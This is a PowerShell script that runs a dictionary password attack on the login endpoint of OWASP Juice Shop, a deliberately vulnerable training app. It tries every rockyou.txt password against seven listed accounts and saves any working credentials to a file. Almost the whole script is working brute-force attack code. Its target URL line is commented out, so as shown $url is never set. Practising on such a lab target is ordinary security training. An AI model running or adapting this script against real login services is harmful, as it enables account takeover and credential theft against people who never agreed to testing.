cls
$LinesToUse = 20
New-Item -Name discoveredPasswords.txt -ErrorAction SilentlyContinue | Out-Null
function Set-Position
{
    param(
        [switch]$Tab,
        [switch]$Reset
    )

    if($Tab)
    {
        $modifiedPosition = $host.UI.RawUI.CursorPosition
        $modifiedPosition.X = ($host.UI.RawUI.CursorPosition.X = ($host.UI.RawUI.WindowSize.Width / 2))
        $host.UI.RawUI.CursorPosition = $modifiedPosition
    }
    if($Reset)
    {
        $host.UI.RawUI.CursorPosition = $origPosition
        # Clear Two Lines
        1..$LinesToUse | ForEach-Object {
            0..($host.UI.RawUI.WindowSize.Width -2) | ForEach-Object {
                Write-Host " " -NoNewline
            }
            Write-Host ""
            # Start-Sleep -Seconds 1
        }
        $host.UI.RawUI.CursorPosition = $origPosition
    }
}
Write-Host "Attempting Logins"
$origPosition = $host.UI.RawUI.CursorPosition
$tabX = ($host.UI.RawUI.CursorPosition.X = ($host.UI.RawUI.WindowSize.Width / 2))
$emails = @('admin@juice-sh.op','jim@juice-sh.op','bender@juice-sh.op','bjoern.kimminich@gmail.com','ciso@juice-sh.op','support@juice-sh.op','morty@juice-sh.op')
Get-Content /usr/share/wordlists/rockyou.txt | ForEach-Object {
    
    $password = $_
    # $emails = $emails
    # $url = 'http://localhost:3000/rest/user/login'
    foreach($email in $emails){
        Write-Host "$($email)" -NoNewline
        Set-Position -Tab
        Write-Host $password
        if($host.UI.RawUI.CursorPosition.Y -ge $LinesToUse)
        {
            Set-Position -Reset
            # Start-Sleep -Seconds 1
        }
        $payload = @{
            'email' = $email
            'password' = $password
        }
        if((Invoke-WebRequest -Uri $url -Method Post -Body $payload -SkipHttpErrorCheck).StatusCode -eq 200){
            
            
            # $output = [PSCustomobject]@{
            #     StatusCode = 200
            #     Attempt = "$email : $password"
            # }
            "$($email):$($password)" | Out-File discoveredPasswords.txt
            break
        }
    }   
}